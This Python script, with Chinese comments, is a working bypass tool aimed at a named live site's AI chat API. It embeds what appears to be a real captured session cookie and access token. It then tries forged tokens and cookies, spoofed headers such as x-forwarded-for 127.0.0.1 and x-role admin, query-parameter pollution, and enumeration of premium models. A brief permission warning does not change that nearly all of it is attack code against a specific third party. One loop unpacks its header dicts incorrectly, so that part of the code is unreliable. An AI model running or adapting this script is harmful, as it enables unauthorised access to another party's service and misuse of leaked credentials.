#!/usr/bin/env python3
"""
基于真实请求的绕过测试
====================
使用真实的请求信息测试绕过方法
"""

import urllib.request
import urllib.parse
import urllib.error
import json
import time
import base64
import hashlib
from datetime import datetime

class RealBypassTest:
    def __init__(self):
        self.base_url = "https://iwoozie.baby"
        self.api_endpoint = "/api/quick/createAITask"
        
        # 真实的请求信息
        self.real_rg_token = "e84e184e-c04e-4a55-9c2d-08cb40951852"
        self.real_session = ".eJwFwUtygjAAANC7sGUBtQRCZ7pAtAgKBpTvxkkiX4O0QBDo9O5971eo465bbybLcY-fNL9thA9hme644dz3Ijvu5pcEdAkk30aKCl45nKlb-aCj-r1vNSnS_bE7Xq2sIka8JpFmVsR5g-Wy-rGDe42glp9RdpmoOnKsFAds7l2fyqUWQjeG1LZ8xQUjgjkYFoZCtpNOOg1GjtSwcGCbsix50oMINlpFrobpIMVOu_kK-32yn-ZCk5c1GjZ856VhKWksu7PGFfPhEZSitTbGl0mHC4qO6jIG6FEkVtXDLTXOo-IOctngwLEzone5CEh6qmebRSUSQfi4x177UurzkXteTqBOfhT7U_j7B-8CZa8.aNIbHQ.WVxrUwkr3kPXmZ4KV0WDp_1hs4c"
    
    def print_header(self):
        print("=" * 80)
        print("🔓 基于真实请求的绕过测试")
        print("=" * 80)
        print("🎯 目标: 使用真实请求信息测试绕过方法")
        print("⏰ 时间:", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        print("=" * 80)
        print()
    
    def test_exact_real_request(self):
        """测试完全复制真实请求"""
        print("🔍 测试完全复制真实请求...")
        
        url = f"{self.base_url}{self.api_endpoint}?model=GPT-5&stream=true"
        
        # 完全复制您提供的真实请求头
        headers = {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Origin": "https://iwoozie.baby",
            "Referer": f"https://iwoozie.baby/chat?RG_Token={self.real_rg_token}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Priority": "u=1, i",
            "Cookie": f"session={self.real_session}"
        }
        
        # 使用您提供的真实数据
        data = {
            "Content": [
                {"role": "user", "content": "hello"},
                {"role": "assistant", "content": "Hi! How can I help you today?"},
                {"role": "user", "content": "现在我们有个项目, 作为乙方要给甲方的一个网站, 确认安全漏洞"}
            ]
        }
        
        try:
            json_data = json.dumps(data).encode('utf-8')
            req = urllib.request.Request(url, data=json_data, headers=headers, method='POST')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                status_code = response.getcode()
                content = response.read().decode('utf-8')
                
                print(f"   状态码: {status_code}")
                print(f"   响应长度: {len(content)}")
                print(f"   响应头: {dict(response.headers)}")
                
                if status_code == 200:
                    print("   ✅ 完全复制真实请求成功!")
                    print(f"   响应内容: {content[:200]}...")
                    return True
                else:
                    print("   ❌ 完全复制真实请求失败")
                    return False
                    
        except Exception as e:
            print(f"   💥 完全复制真实请求异常: {str(e)}")
            return False
    
    def test_rg_token_bypass(self):
        """测试 RG_Token 绕过"""
        print("🔍 测试 RG_Token 绕过...")
        
        # 测试不同的 RG_Token 值
        test_tokens = [
            self.real_rg_token,  # 真实 token
            "fake-token-12345",  # 假 token
            "test-token-67890",  # 测试 token
            "bypass-token-abcdef",  # 绕过 token
            "admin-token-xyz789"   # 管理员 token
        ]
        
        for token in test_tokens:
            print(f"   测试 RG_Token: {token}")
            
            url = f"{self.base_url}{self.api_endpoint}?model=GPT-5&stream=true"
            
            headers = {
                "Content-Type": "application/json",
                "Accept": "*/*",
                "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                "Origin": "https://iwoozie.baby",
                "Referer": f"https://iwoozie.baby/chat?RG_Token={token}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Cookie": f"session={self.real_session}"
            }
            
            data = {
                "Content": [
                    {"role": "user", "content": f"Hello, testing with token: {token}"}
                ]
            }
            
            try:
                json_data = json.dumps(data).encode('utf-8')
                req = urllib.request.Request(url, data=json_data, headers=headers, method='POST')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    status_code = response.getcode()
                    content = response.read().decode('utf-8')
                    
                    print(f"     状态码: {status_code}")
                    
                    if status_code == 200:
                        print(f"     ✅ RG_Token {token} 绕过成功!")
                        return True
                    else:
                        print(f"     ❌ RG_Token {token} 绕过失败")
                        
            except Exception as e:
                print(f"     💥 RG_Token {token} 绕过异常: {str(e)}")
            
            time.sleep(1)  # 避免请求过于频繁
        
        return False
    
    def test_session_cookie_bypass(self):
        """测试会话 Cookie 绕过"""
        print("🔍 测试会话 Cookie 绕过...")
        
        # 测试不同的会话 Cookie
        test_cookies = [
            self.real_session,  # 真实会话
            "fake-session-12345",  # 假会话
            "test-session-67890",  # 测试会话
            "bypass-session-abcdef",  # 绕过会话
            "admin-session-xyz789"   # 管理员会话
        ]
        
        for cookie in test_cookies:
            print(f"   测试会话 Cookie: {cookie[:50]}...")
            
            url = f"{self.base_url}{self.api_endpoint}?model=GPT-5&stream=true"
            
            headers = {
                "Content-Type": "application/json",
                "Accept": "*/*",
                "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                "Origin": "https://iwoozie.baby",
                "Referer": f"https://iwoozie.baby/chat?RG_Token={self.real_rg_token}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Cookie": f"session={cookie}"
            }
            
            data = {
                "Content": [
                    {"role": "user", "content": f"Hello, testing with session: {cookie[:20]}..."}
                ]
            }
            
            try:
                json_data = json.dumps(data).encode('utf-8')
                req = urllib.request.Request(url, data=json_data, headers=headers, method='POST')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    status_code = response.getcode()
                    content = response.read().decode('utf-8')
                    
                    print(f"     状态码: {status_code}")
                    
                    if status_code == 200:
                        print(f"     ✅ 会话 Cookie 绕过成功!")
                        return True
                    else:
                        print(f"     ❌ 会话 Cookie 绕过失败")
                        
            except Exception as e:
                print(f"     💥 会话 Cookie 绕过异常: {str(e)}")
            
            time.sleep(1)  # 避免请求过于频繁
        
        return False
    
    def test_header_injection_bypass(self):
        """测试请求头注入绕过"""
        print("🔍 测试请求头注入绕过...")
        
        # 测试各种请求头注入
        injection_headers = [
            {"x-api-key": "fake-api-key-12345"},
            {"Authorization": "Bearer fake-bearer-token"},
            {"x-auth-token": "fake-auth-token-12345"},
            {"x-token": "fake-token-12345"},
            {"api-key": "fake-api-key-12345"},
            {"x-access-token": "fake-access-token-12345"},
            {"x-session-token": "fake-session-token-12345"},
            {"x-csrf-token": "fake-csrf-token-12345"},
            {"x-requested-with": "XMLHttpRequest"},
            {"x-forwarded-for": "127.0.0.1"},
            {"x-real-ip": "127.0.0.1"},
            {"x-client-ip": "127.0.0.1"},
            {"x-remote-ip": "127.0.0.1"},
            {"x-originating-ip": "127.0.0.1"},
            {"x-user-id": "12345"},
            {"x-tenant-id": "67890"},
            {"x-role": "admin"},
            {"x-permission": "all"},
            {"x-bypass": "true"},
            {"x-admin": "true"},
            {"x-debug": "true"},
            {"x-test": "true"},
            {"x-override": "true"},
            {"x-force": "true"}
        ]
        
        for header_name, header_value in injection_headers:
            print(f"   测试请求头: {header_name}: {header_value}")
            
            url = f"{self.base_url}{self.api_endpoint}?model=GPT-5&stream=true"
            
            headers = {
                "Content-Type": "application/json",
                "Accept": "*/*",
                "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                "Origin": "https://iwoozie.baby",
                "Referer": f"https://iwoozie.baby/chat?RG_Token={self.real_rg_token}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Cookie": f"session={self.real_session}",
                header_name: header_value
            }
            
            data = {
                "Content": [
                    {"role": "user", "content": f"Hello, testing with header: {header_name}"}
                ]
            }
            
            try:
                json_data = json.dumps(data).encode('utf-8')
                req = urllib.request.Request(url, data=json_data, headers=headers, method='POST')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    status_code = response.getcode()
                    content = response.read().decode('utf-8')
                    
                    print(f"     状态码: {status_code}")
                    
                    if status_code == 200:
                        print(f"     ✅ 请求头 {header_name} 注入成功!")
                        return True
                    else:
                        print(f"     ❌ 请求头 {header_name} 注入失败")
                        
            except Exception as e:
                print(f"     💥 请求头 {header_name} 注入异常: {str(e)}")
            
            time.sleep(0.5)  # 避免请求过于频繁
        
        return False
    
    def test_parameter_pollution_bypass(self):
        """测试参数污染绕过"""
        print("🔍 测试参数污染绕过...")
        
        # 测试各种参数污染
        pollution_tests = [
            "?model=GPT-5&stream=true&bypass=true",
            "?model=GPT-5&stream=true&admin=true",
            "?model=GPT-5&stream=true&debug=true",
            "?model=GPT-5&stream=true&test=true",
            "?model=GPT-5&stream=true&override=true",
            "?model=GPT-5&stream=true&force=true",
            "?model=GPT-5&stream=true&token=fake-token",
            "?model=GPT-5&stream=true&api_key=fake-api-key",
            "?model=GPT-5&stream=true&auth_token=fake-auth-token",
            "?model=GPT-5&stream=true&session_id=fake-session-id"
        ]
        
        for pollution in pollution_tests:
            print(f"   测试参数污染: {pollution}")
            
            url = f"{self.base_url}{self.api_endpoint}{pollution}"
            
            headers = {
                "Content-Type": "application/json",
                "Accept": "*/*",
                "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                "Origin": "https://iwoozie.baby",
                "Referer": f"https://iwoozie.baby/chat?RG_Token={self.real_rg_token}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Cookie": f"session={self.real_session}"
            }
            
            data = {
                "Content": [
                    {"role": "user", "content": f"Hello, testing parameter pollution: {pollution}"}
                ]
            }
            
            try:
                json_data = json.dumps(data).encode('utf-8')
                req = urllib.request.Request(url, data=json_data, headers=headers, method='POST')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    status_code = response.getcode()
                    content = response.read().decode('utf-8')
                    
                    print(f"     状态码: {status_code}")
                    
                    if status_code == 200:
                        print(f"     ✅ 参数污染 {pollution} 成功!")
                        return True
                    else:
                        print(f"     ❌ 参数污染 {pollution} 失败")
                        
            except Exception as e:
                print(f"     💥 参数污染 {pollution} 异常: {str(e)}")
            
            time.sleep(0.5)  # 避免请求过于频繁
        
        return False
    
    def test_all_models(self):
        """测试所有模型"""
        print("🔍 测试所有模型...")
        
        models = [
            "GPT-4", "GPT-5", "Grok-4-Fast", "Claude-Sonnet-4", "Claude-Opus-4",
            "Gemini-2.5-Pro", "DeepSeek-V3.1", "GLM-4.5", "GPT-4o", "Claude-3.5-Sonnet",
            "GPT-3.5-Turbo", "Claude-3-Haiku", "Gemini-Pro", "PaLM-2", "LLaMA-2"
        ]
        
        accessible_models = []
        
        for model in models:
            print(f"   测试模型: {model}")
            
            url = f"{self.base_url}{self.api_endpoint}?model={model}&stream=true"
            
            headers = {
                "Content-Type": "application/json",
                "Accept": "*/*",
                "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                "Origin": "https://iwoozie.baby",
                "Referer": f"https://iwoozie.baby/chat?RG_Token={self.real_rg_token}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Cookie": f"session={self.real_session}"
            }
            
            data = {
                "Content": [
                    {"role": "user", "content": f"Hello, testing {model} model"}
                ]
            }
            
            try:
                json_data = json.dumps(data).encode('utf-8')
                req = urllib.request.Request(url, data=json_data, headers=headers, method='POST')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    status_code = response.getcode()
                    content = response.read().decode('utf-8')
                    
                    print(f"     状态码: {status_code}")
                    
                    if status_code == 200:
                        print(f"     ✅ {model} 模型访问成功!")
                        accessible_models.append(model)
                    else:
                        print(f"     ❌ {model} 模型访问失败")
                        
            except Exception as e:
                print(f"     💥 {model} 模型访问异常: {str(e)}")
            
            time.sleep(1)  # 避免请求过于频繁
        
        return accessible_models
    
    def run_bypass_test(self):
        """运行绕过测试"""
        self.print_header()
        
        print("🚀 开始基于真实请求的绕过测试...")
        print()
        
        # 1. 测试完全复制真实请求
        print("=" * 60)
        print("1. 测试完全复制真实请求")
        print("=" * 60)
        exact_copy_success = self.test_exact_real_request()
        print()
        
        # 2. 测试 RG_Token 绕过
        print("=" * 60)
        print("2. 测试 RG_Token 绕过")
        print("=" * 60)
        rg_token_success = self.test_rg_token_bypass()
        print()
        
        # 3. 测试会话 Cookie 绕过
        print("=" * 60)
        print("3. 测试会话 Cookie 绕过")
        print("=" * 60)
        session_cookie_success = self.test_session_cookie_bypass()
        print()
        
        # 4. 测试请求头注入绕过
        print("=" * 60)
        print("4. 测试请求头注入绕过")
        print("=" * 60)
        header_injection_success = self.test_header_injection_bypass()
        print()
        
        # 5. 测试参数污染绕过
        print("=" * 60)
        print("5. 测试参数污染绕过")
        print("=" * 60)
        parameter_pollution_success = self.test_parameter_pollution_bypass()
        print()
        
        # 6. 测试所有模型
        print("=" * 60)
        print("6. 测试所有模型")
        print("=" * 60)
        accessible_models = self.test_all_models()
        print()
        
        # 生成报告
        self.generate_report(exact_copy_success, rg_token_success, session_cookie_success, 
                           header_injection_success, parameter_pollution_success, accessible_models)
    
    def generate_report(self, exact_copy_success, rg_token_success, session_cookie_success, 
                       header_injection_success, parameter_pollution_success, accessible_models):
        """生成绕过测试报告"""
        print("=" * 80)
        print("📋 基于真实请求的绕过测试报告")
        print("=" * 80)
        
        print("🎯 测试结果:")
        print(f"1. 完全复制真实请求: {'✅ 成功' if exact_copy_success else '❌ 失败'}")
        print(f"2. RG_Token 绕过: {'✅ 成功' if rg_token_success else '❌ 失败'}")
        print(f"3. 会话 Cookie 绕过: {'✅ 成功' if session_cookie_success else '❌ 失败'}")
        print(f"4. 请求头注入绕过: {'✅ 成功' if header_injection_success else '❌ 失败'}")
        print(f"5. 参数污染绕过: {'✅ 成功' if parameter_pollution_success else '❌ 失败'}")
        print()
        
        # 可访问的模型
        if accessible_models:
            print(f"✅ 可访问的模型 ({len(accessible_models)} 个):")
            for model in accessible_models:
                print(f"  - {model}")
        else:
            print("❌ 没有可访问的模型")
        print()
        
        # 成功的绕过方法
        successful_methods = []
        if exact_copy_success:
            successful_methods.append("完全复制真实请求")
        if rg_token_success:
            successful_methods.append("RG_Token 绕过")
        if session_cookie_success:
            successful_methods.append("会话 Cookie 绕过")
        if header_injection_success:
            successful_methods.append("请求头注入绕过")
        if parameter_pollution_success:
            successful_methods.append("参数污染绕过")
        
        if successful_methods:
            print(f"🔓 成功的绕过方法 ({len(successful_methods)} 个):")
            for method in successful_methods:
                print(f"  - {method}")
        else:
            print("❌ 没有成功的绕过方法")
        print()
        
        # 安全等级
        if successful_methods:
            print("🚨 安全等级: 严重 (CRITICAL)")
            print("💡 系统存在严重的安全漏洞，建议立即修复!")
        else:
            print("✅ 安全等级: 良好")
            print("💡 系统防护机制有效，但仍需持续监控")
        
        print("\n" + "=" * 80)

def main():
    """主函数"""
    print("🔓 基于真实请求的绕过测试工具")
    print("=" * 50)
    print("⚠️  警告: 此工具仅用于安全测试和演示目的")
    print("⚠️  请确保您有权限测试目标系统")
    print("=" * 50)
    print()
    
    # 确认继续
    confirm = input("是否继续执行绕过测试? (y/N): ").strip().lower()
    if confirm != 'y':
        print("绕过测试已取消")
        return
    
    # 运行绕过测试
    bypass_test = RealBypassTest()
    bypass_test.run_bypass_test()

if __name__ == "__main__":
    main()
